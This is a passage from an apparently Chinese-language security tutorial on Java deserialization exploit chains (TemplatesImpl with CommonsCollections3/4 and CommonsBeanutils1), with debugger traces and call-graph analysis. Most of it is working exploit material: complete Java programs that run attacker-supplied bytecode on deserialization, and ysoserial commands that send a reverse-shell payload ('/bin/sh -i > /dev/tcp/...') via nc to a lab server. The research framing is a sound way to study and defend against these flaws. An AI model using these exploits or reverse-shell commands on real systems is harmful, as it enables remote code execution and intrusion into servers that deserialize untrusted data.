 * 结合EvilClientWithLazyMap.java、TemplatesImplExec.java修改而来
 */
public class TemplatesImplExecWithTrAXFilter
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String              evilclass   = argv[0];
        byte[]              evilbyte    = Files.readAllBytes( ( new File( evilclass ) ).toPath() );
        TemplatesImpl       ti          = new TemplatesImpl();
        Field               _bytecodes  = TemplatesImpl.class.getDeclaredField( "_bytecodes" );
        _bytecodes.setAccessible( true );
        _bytecodes.set( ti, new byte[][] { evilbyte }  );
        Field               _tfactory   = TemplatesImpl.class.getDeclaredField( "_tfactory" );
        _tfactory.setAccessible( true );
        _tfactory.set( ti, new TransformerFactoryImpl() );
        Field               _name       = TemplatesImpl.class.getDeclaredField( "_name" );
        _name.setAccessible( true );
        _name.set( ti, "" );
        /*
         * 这次不直接Runtime.getRuntime().exec()，而是通过
         * TemplatesImpl.newTransformer()加载恶意类、执行恶意构造函数
         */
        Transformer[]       tarray      = new Transformer[]
        {
            /*
             * com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter
             *
             * TrAXFilter(templates)中会调用templates.newTransformer()
             */
            new ConstantTransformer( TrAXFilter.class ),
            /*
             * 第二个不再是InvokerTransformer
             *
             * InstantiateTransformer.transform()中会调用指定类的构造函数
             */
            new InstantiateTransformer
            (
                /*
                 * 这里指定TrAXFilter()的形参
                 *
                 * public TrAXFilter(Templates templates)
                 */
                new Class[]
                {
                    /*
                     * 这是个接口
                     */
                    Templates.class
                },
                new Object[]
                {
                    ti
                }
            )
        };
        Transformer         tchain      = new ChainedTransformer( tarray );
        Map                 normalMap   = new HashMap();
        Map                 lazyMap     = LazyMap.decorate( normalMap, tchain );
        Class               clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
        Constructor         cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
        cons.setAccessible( true );
        InvocationHandler   ih          = ( InvocationHandler )cons.newInstance( Retention.class, lazyMap );
        Map                 mapProxy    = ( Map )Proxy.newProxyInstance
        (
            Map.class.getClassLoader(),
            new  Class[] { Map.class },
            ih
        );
        Object              obj         = cons.newInstance( Retention.class, mapProxy );
        /*
         * 单机版
         */
        ByteArrayOutputStream
                            bos         = new ByteArrayOutputStream();
        ObjectOutputStream
                            oos         = new ObjectOutputStream( bos );
        oos.writeObject( obj );
        ByteArrayInputStream
                            bis         = new ByteArrayInputStream( bos.toByteArray() );
        ObjectInputStream
                            ois         = new ObjectInputStream( bis );
        /*
         * 通过反序列化触发TemplatesImpl.newTransformer()
         */
        ois.readObject();
    }
}
```

执行时会抛出异常，但恶意构造函数已被执行。

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
TemplatesImplExecWithTrAXFilter JacksonExploit.class

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in JacksonExploit.<init>

  [1] JacksonExploit.<init> (JacksonExploit.java:23), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:422), pc = 79
  [6] java.lang.Class.newInstance (Class.java:442), pc = 138
  [7] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance (TemplatesImpl.java:387), pc = 29
  [8] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer (TemplatesImpl.java:418), pc = 5
  [9] com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.<init> (TrAXFilter.java:64), pc = 16
  [10] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [11] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [12] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [13] java.lang.reflect.Constructor.newInstance (Constructor.java:422), pc = 79
  [14] org.apache.commons.collections.functors.InstantiateTransformer.transform (InstantiateTransformer.java:105), pc = 66
  [15] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [16] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [17] sun.reflect.annotation.AnnotationInvocationHandler.invoke (AnnotationInvocationHandler.java:77), pc = 204
  [18] com.sun.proxy.$Proxy1.entrySet (null), pc = 9
  [19] sun.reflect.annotation.AnnotationInvocationHandler.readObject (AnnotationInvocationHandler.java:444), pc = 37
  [20] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [21] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [22] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [23] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [24] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [25] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [26] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [27] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [28] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
  [29] TemplatesImplExecWithTrAXFilter.main (TemplatesImplExecWithTrAXFilter.java:107), pc = 338

8.8.6) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  AnnotationInvocationHandler.readObject
    Map($Proxy1).entrySet
      AnnotationInvocationHandler.invoke
        LazyMap.get                             // 此处开始LazyMap利用链
          ChainedTransformer.transform
            InstantiateTransformer.transform
              TrAXFilter.<init>
                TemplatesImpl.newTransformer    // 此处开始TemplatesImpl利用链
                  TemplatesImpl.getTransletInstance
--------------------------------------------------------------------------

8.8.7) ysoserial/CommonsCollections3

参[52]

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections3.java

测试:

nc -l -p 7474

java_8_40 \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections3 \
'sh -c $@|sh any echo /bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1' \
| nc -n 192.168.65.23 1414

假设想快速知道"ysoserial/CommonsCollections3"在干什么，静态看源码是一条路，
动态调试也是一条路，比如:

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String)

  [1] java.lang.Runtime.exec (Runtime.java:347), pc = 0
  [2] ysoserial.Pwner864589189503762.<clinit> (null), pc = 10
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [4] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [5] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [6] java.lang.reflect.Constructor.newInstance (Constructor.java:422), pc = 79
  [7] java.lang.Class.newInstance (Class.java:442), pc = 138
  [8] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance (TemplatesImpl.java:387), pc = 29
  [9] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer (TemplatesImpl.java:418), pc = 5
  [10] com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.<init> (TrAXFilter.java:64), pc = 16
  [11] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [12] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [13] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [14] java.lang.reflect.Constructor.newInstance (Constructor.java:422), pc = 79
  [15] org.apache.commons.collections.functors.InstantiateTransformer.transform (InstantiateTransformer.java:105), pc = 66
  [16] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [17] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [18] sun.reflect.annotation.AnnotationInvocationHandler.invoke (AnnotationInvocationHandler.java:77), pc = 204
  [19] com.sun.proxy.$Proxy0.entrySet (null), pc = 9
  [20] sun.reflect.annotation.AnnotationInvocationHandler.readObject (AnnotationInvocationHandler.java:444), pc = 37
  [21] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [22] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [23] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [24] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [25] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [26] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [27] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [28] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [29] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
  [30] VulnerableServer.main (VulnerableServer.java:22), pc = 51

不用jdb的话，用Eclipse之类的GUI工具Attach上去，查看各层栈帧处的代码，很快
就能厘清整个流程。陆游写过一首诗:

《冬夜读书示子聿》

古人学问无遗力，少壮工夫老始成。
纸上得来终觉浅，绝知此事要躬行。

你可能听过它最有名的后两句。很多事情是这样的，你看别人的文章是一回事，自己
动手走一遍是另一回事。别人的文章终归只是个信息提供者，想转换成自己的知识，
必须带着"为什么"去实践一番，自问自答，比你看多少文章都有用。

接着喷安全圈的怪现象。有一类文章，在那里装模作样地"分析"一通，恨不得把各种
库源码搬上来，最后却是只见树木不见森林的无意义分析，我称之为"伪分析"。还有
一类比前一类更扯淡的，就是假模假式地进行因果推导，好像那样那样就可以发现那
个漏洞，事实上TA只是在有了Exploit之后的"伪因果推导"，完全看不出原始因果。
要是作不出因果推导，就老老实实说只是复现，没必要装这个X。

8.8.8) TemplatesImplExecWithTrAXFilter4.java

对应"ysoserial/CommonsCollections4"，这是个单机版。

```java
*
 * javac -encoding GBK -g -XDignore.symbol.file -cp "commons-collections4-4.0.jar" TemplatesImplExecWithTrAXFilter4.java
 * java -cp "commons-collections4-4.0.jar:." TemplatesImplExecWithTrAXFilter4 JacksonExploit.class
 */
import java.io.*;
import java.net.Socket;
import java.util.*;
import java.lang.reflect.*;
import java.lang.annotation.*;
import java.nio.file.Files;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import javax.xml.transform.Templates;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.*;
import org.apache.commons.collections4.comparators.TransformingComparator;

/*
 * 结合TemplatesImplExec.java、TemplatesImplExecWithTrAXFilter.java修改而来
 */
public class TemplatesImplExecWithTrAXFilter4
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          evilclass   = argv[0];
        byte[]          evilbyte    = Files.readAllBytes( ( new File( evilclass ) ).toPath() );
        TemplatesImpl   ti          = new TemplatesImpl();
        Field           _bytecodes  = TemplatesImpl.class.getDeclaredField( "_bytecodes" );
        _bytecodes.setAccessible( true );
        _bytecodes.set( ti, new byte[][] { evilbyte }  );
        Field           _tfactory   = TemplatesImpl.class.getDeclaredField( "_tfactory" );
        _tfactory.setAccessible( true );
        _tfactory.set( ti, new TransformerFactoryImpl() );
        Field           _name       = TemplatesImpl.class.getDeclaredField( "_name" );
        _name.setAccessible( true );
        _name.set( ti, "" );
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( TrAXFilter.class ),
            new InstantiateTransformer
            (
                new Class[]
                {
                    Templates.class
                },
                new Object[]
                {
                    ti
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        PriorityQueue   pq          = new PriorityQueue( 2, null );
        pq.add( 0 );
        pq.add( 1 );
        Field           comparator  = PriorityQueue.class.getDeclaredField( "comparator" );
        comparator.setAccessible( true );
        /*
         * ChainedTransformer是通过comparator触发的
         */
        comparator.set( pq, new TransformingComparator( tchain ) );
        Field           q           = PriorityQueue.class.getDeclaredField( "queue" );
        q.setAccessible( true );
        Object[]        queue       = ( Object[] )q.get( pq );
        queue[0]                    = ti;
        ByteArrayOutputStream
                        bos         = new ByteArrayOutputStream();
        ObjectOutputStream
                        oos         = new ObjectOutputStream( bos );
        oos.writeObject( pq );
        ByteArrayInputStream
                        bis         = new ByteArrayInputStream( bos.toByteArray() );
        ObjectInputStream
                        ois         = new ObjectInputStream( bis );
        ois.readObject();
    }
}
```

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections4-4.0.jar:." \
TemplatesImplExecWithTrAXFilter4 JacksonExploit.class

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in JacksonExploit.<init>

  [1] JacksonExploit.<init> (JacksonExploit.java:23), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [6] java.lang.Class.newInstance (Class.java:442), pc = 138
  [7] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance (TemplatesImpl.java:455), pc = 29
  [8] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer (TemplatesImpl.java:486), pc = 5
  [9] com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.<init> (TrAXFilter.java:58), pc = 11
  [10] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [11] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [12] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [13] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [14] org.apache.commons.collections4.functors.InstantiateTransformer.transform (InstantiateTransformer.java:116), pc = 28
  [15] org.apache.commons.collections4.functors.InstantiateTransformer.transform (InstantiateTransformer.java:32), pc = 5
  [16] org.apache.commons.collections4.functors.ChainedTransformer.transform (ChainedTransformer.java:112), pc = 26
  [17] org.apache.commons.collections4.comparators.TransformingComparator.compare (TransformingComparator.java:81), pc = 5
  [18] java.util.PriorityQueue.siftDownUsingComparator (PriorityQueue.java:722), pc = 83
  [19] java.util.PriorityQueue.siftDown (PriorityQueue.java:688), pc = 10
  [20] java.util.PriorityQueue.heapify (PriorityQueue.java:737), pc = 21
  [21] java.util.PriorityQueue.readObject (PriorityQueue.java:797), pc = 62
  [22] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [23] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [24] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [25] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [26] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [27] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [28] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [29] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [30] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [31] TemplatesImplExecWithTrAXFilter4.main (TemplatesImplExecWithTrAXFilter4.java:75), pc = 314

8.8.9) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  PriorityQueue.readObject
    PriorityQueue.heapify
      TransformingComparator.compare        // 通过优先队列的比较器触发
        ChainedTransformer.transform        // 不是InvokerTransformer
          InstantiateTransformer.transform
            TrAXFilter.<init>
              TemplatesImpl.newTransformer  // 此处开始TemplatesImpl利用链
                TemplatesImpl.getTransletInstance
--------------------------------------------------------------------------

就是在搞排列组合，没有新意，但有现实意义，这个利用链适用于8u232和4.0。

8.8.10) ysoserial/CommonsCollections4

参[52]，8u232可以得手。

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections4.java

测试:

nc -l -p 7474

java \
-cp "commons-collections4-4.0.jar:." \
VulnerableServer 192.168.65.23 1414

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 \
'sh -c $@|sh any echo /bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1' \
| nc -n 192.168.65.23 1414

8.8.11) commons-collections4-4.1的变化

4.0的InstantiateTransformer实现了两个接口:

Transformer
Serializable

4.1的InstantiateTransformer只实现了一个接口:

Transformer

对于4.1，"简化版调用关系"中出现"InstantiateTransformer.transform"的利用链
都被阻断，比如CommonsCollections3、CommonsCollections4。

$ java -cp "commons-collections4-4.1.jar:." TemplatesImplExecWithTrAXFilter4 JacksonExploit.class
Exception in thread "main" java.io.NotSerializableException: org.apache.commons.collections4.functors.InstantiateTransformer
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1184)
        at java.io.ObjectOutputStream.writeArray(ObjectOutputStream.java:1378)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1174)
        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)
        at java.io.ObjectOutputStream.defaultWriteObject(ObjectOutputStream.java:441)
        at java.util.PriorityQueue.writeObject(PriorityQueue.java:764)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:1140)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1496)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)
        at TemplatesImplExecWithTrAXFilter4.main(TemplatesImplExecWithTrAXFilter4.java:70)

8.8.12) TemplatesImplExecWithBeanComparator.java

对应"ysoserial/CommonsBeanutils1"，这是个单机版。

```java
*
 * javac -encoding GBK -g -XDignore.symbol.file -cp "commons-beanutils-1.9.2.jar" TemplatesImplExecWithBeanComparator.java
 * java -cp "commons-beanutils-1.9.2.jar:commons-collections-3.1.jar:commons-logging-1.2.jar:." TemplatesImplExecWithBeanComparator JacksonExploit.class
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import org.apache.commons.beanutils.BeanComparator;

/*
 * 从TemplatesImplExec.java修改而来，比较器由TransformingComparator变成
 * BeanComparator
 */
public class TemplatesImplExecWithBeanComparator
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          evilclass   = argv[0];
        byte[]          evilbyte    = Files.readAllBytes( ( new File( evilclass ) ).toPath() );
        TemplatesImpl   ti          = new TemplatesImpl();
        Field           _bytecodes  = TemplatesImpl.class.getDeclaredField( "_bytecodes" );
        _bytecodes.setAccessible( true );
        _bytecodes.set( ti, new byte[][] { evilbyte }  );
        Field           _tfactory   = TemplatesImpl.class.getDeclaredField( "_tfactory" );
        _tfactory.setAccessible( true );
        _tfactory.set( ti, new TransformerFactoryImpl() );
        Field           _name       = TemplatesImpl.class.getDeclaredField( "_name" );
        _name.setAccessible( true );
        _name.set( ti, "" );
        PriorityQueue   pq          = new PriorityQueue( 2, null );
        /*
         * pq.add()会触发如下调用:
         *
         * PriorityQueue.add
         *   PriorityQueue.offer
         *     PriorityQueue.siftUp
         *       PriorityQueue.siftUpUsingComparator
         *         BeanComparator.compare
         *           PropertyUtils.getProperty
         *             PropertyUtilsBean.getSimpleProperty
         *               TemplatesImpl.getOutputProperties
         *
         * 所以我在pq.add()之后利用反射方式设置comparator，避免
         * BeanComparator.compare()被提前调用。
         *
         * 两个占位
         */
        pq.add( 0 );
        pq.add( 1 );
        Field           comparator  = PriorityQueue.class.getDeclaredField( "comparator" );
        comparator.setAccessible( true );
        /*
         * TemplatesImpl.getOutputProperties()是通过comparator触发的
         */
        comparator.set( pq, new BeanComparator( "outputProperties" ) );
        Field           q           = PriorityQueue.class.getDeclaredField( "queue" );
        q.setAccessible( true );
        Object[]        queue       = ( Object[] )q.get( pq );
        queue[0]                    = ti;
        ByteArrayOutputStream
                        bos         = new ByteArrayOutputStream();
        ObjectOutputStream
                        oos         = new ObjectOutputStream( bos );
        oos.writeObject( pq );
        ByteArrayInputStream
                        bis         = new ByteArrayInputStream( bos.toByteArray() );
        ObjectInputStream
                        ois         = new ObjectInputStream( bis );
        ois.readObject();
    }
}
```

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-beanutils-1.9.2.jar:commons-collections-3.1.jar:commons-logging-1.2.jar:." \
TemplatesImplExecWithBeanComparator JacksonExploit.class

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in JacksonExploit.<init>

  [1] JacksonExploit.<init> (JacksonExploit.java:23), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [6] java.lang.Class.newInstance (Class.java:442), pc = 138
  [7] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance (TemplatesImpl.java:455), pc = 29
  [8] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer (TemplatesImpl.java:486), pc = 5
  [9] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties (TemplatesImpl.java:507), pc = 1
  [10] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [11] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [12] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [13] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [14] org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod (PropertyUtilsBean.java:2,116), pc = 17
  [15] org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty (PropertyUtilsBean.java:1,267), pc = 433
  [16] org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty (PropertyUtilsBean.java:808), pc = 292
  [17] org.apache.commons.beanutils.PropertyUtilsBean.getProperty (PropertyUtilsBean.java:884), pc = 3
  [18] org.apache.commons.beanutils.PropertyUtils.getProperty (PropertyUtils.java:464), pc = 5
  [19] org.apache.commons.beanutils.BeanComparator.compare (BeanComparator.java:163), pc = 19
  [20] java.util.PriorityQueue.siftDownUsingComparator (PriorityQueue.java:722), pc = 83
  [21] java.util.PriorityQueue.siftDown (PriorityQueue.java:688), pc = 10
  [22] java.util.PriorityQueue.heapify (PriorityQueue.java:737), pc = 21
  [23] java.util.PriorityQueue.readObject (PriorityQueue.java:797), pc = 62
  [24] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [25] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [26] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [27] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [28] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [29] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [30] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [31] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [32] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [33] TemplatesImplExecWithBeanComparator.main (TemplatesImplExecWithBeanComparator.java:72), pc = 258

8.8.13) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  PriorityQueue.readObject
    PriorityQueue.heapify
      BeanComparator.compare                    // 通过优先队列的比较器触发
                                                // 比较器是BeanComparator，不再是TransformingComparator
        PropertyUtils.getProperty               // bean=TemplatesImpl name=outputProperties
                                                // 将去bean中寻找name对应的属性
          PropertyUtilsBean.getSimpleProperty
            TemplatesImpl.getOutputProperties   // 对比Jackson(CVE-2017-7525)、Fastjson的TemplatesImpl利用链
              TemplatesImpl.newTransformer      // 此处开始TemplatesImpl利用链
                TemplatesImpl.getTransletInstance
--------------------------------------------------------------------------

这次完全不涉及Transformer机制，要点是BeanComparator比较器。

8.8.14) ysoserial/CommonsBeanutils1

参[52]

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java

测试:

nc -l -p 7474

java \
-cp "commons-beanutils-1.9.2.jar:commons-collections-3.1.jar:commons-logging-1.2.jar:." \
VulnerableServer 192.168.65.23 1414

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 \
'sh -c $@|sh any echo /bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1' \
| nc -n 192.168.65.23 1414

回答几个疑问:

--------------------------------------------------------------------------
a) 为什么new BeanComparator("lowestSetBit")，"lowestSetBit"是干什么的？
b) 为什么queue.add(new BigInteger("1"))，不用BigInteger行不行？
c) 为什么Reflections.setFieldValue(comparator,"property","outputProperties")
--------------------------------------------------------------------------

问题c，BeanComparator有个属性叫property，它的值决定将来去bean中找谁。比如
property值为"nsfocus"，将来就会去bean中找名为nsfocus的属性，这一般会触发对
bean.getNsfocus()的调用，这是一种固定套路。现在bean是TemplatesImpl，如果能
触发TemplatesImpl.getOutputProperties()，就进入了熟悉的TemplatesImpl利用链。

问题a，BeanComparator("lowestSetBit")会将property的值设成"lowestSetBit"，
意味着将来要调用bean.getLowestSetBit()，哪个类有这种函数？

java.math.BigInteger.getLowestSetBit()

问题b的答案出来了一半。

为什么问题a中不直接BeanComparator("outputProperties")，问题b中不直接
queue.add(new TemplatesImpl())？因为有如下调用关系:

PriorityQueue.add
  PriorityQueue.offer
    PriorityQueue.siftUp
      PriorityQueue.siftUpUsingComparator
        BeanComparator.compare
          PropertyUtils.getProperty
            PropertyUtilsBean.getSimpleProperty
              TemplatesImpl.getOutputProperties

执行PriorityQueue.add()时会调用TemplatesImpl.getOutputProperties()，在数据
准备阶段触发恶意代码，显然这不是期望行为。而BigInteger.getLowestSetBit()是
个无害函数，没有副作用。

我则是生成PriorityQueue对象时不指定比较器，从而避免提前触发
BeanComparator.compare()，占位成功后再用反射方式设置比较器。

参看"8.8.4) ysoserial/CommonsCollections2"小节的类似讨论。

8.8.15) 能否用TreeSet替换PriorityQueue

容器只要涉及排序，很可能就涉及比较器，PriorityQueue就是这样的。TreeSet是有
序集合，也可以指定比较器。事实上TreeSet本身没有比较器，是它底层的TreeMap有
比较器。写了两个测试程序，分别用TreeSet、TreeMap替换PriorityQueue，用反射
方式修改底层数据，包括比较器。但这两个测试程序都未能得手，调试发现这两种类
型的反序列化操作不会触发比较器。TreeSet.add()、TreeMap.put()、TreeMap.get()
会触发比较器，但其实现上会优先触发key.newTransformer()，再触发容器中原有的
TemplatesImpl.newTransformer()。假设现实世界victim在readObject()之后有add()、
put()、get()之类的操作，一般来说此时的key不可控，而key的类型很大可能没有
newTransformer()这个方法，于是抛异常，还是等不到反序列化上来的可控的
TemplatesImpl.newTransformer()。这些都是8u232的测试结论。

所以，我认为在"8.8) TemplatesImpl利用链"小节这个上下文里，不能用TreeSet、
TreeMap替换PriorityQueue。尽管结论令人沮丧，但测试代码编写及调试分析过程还
是让我增长了一些经验值，不亏。

8.9) DefaultedMap利用链

参[56]。作者在给WCTF出题时对服务端做了手脚，让TransformedMap利用链、LazyMap
